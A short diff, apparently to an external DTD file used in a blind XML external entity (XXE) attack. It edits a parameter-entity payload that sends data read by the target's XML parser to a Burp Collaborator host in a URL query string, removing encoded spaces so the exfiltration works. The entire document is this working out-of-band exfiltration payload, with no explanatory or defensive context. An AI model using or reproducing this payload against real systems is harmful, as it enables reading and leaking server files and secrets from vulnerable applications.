@@ -1,2 +1,2 @@
-<!ENTITY % all "<!ENTITY xxe SYSTEM 'http://fatrqgltdh6awaj7s0ja3ji9p0vrjg.burpcollaborator.net?collect=%20%data;%20'>">
+<!ENTITY % all "<!ENTITY xxe SYSTEM 'http://fatrqgltdh6awaj7s0ja3ji9p0vrjg.burpcollaborator.net?collect=%data;'>">
 %all;
